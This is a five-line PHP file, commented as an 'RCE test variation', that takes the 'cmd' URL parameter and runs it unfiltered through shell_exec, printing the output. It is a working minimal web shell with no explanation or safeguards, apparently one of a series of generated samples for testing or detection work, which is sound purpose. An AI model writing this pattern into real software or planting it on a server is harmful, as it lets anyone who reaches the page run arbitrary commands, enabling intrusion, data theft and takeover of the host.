<?php
// RCE test variation #610
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>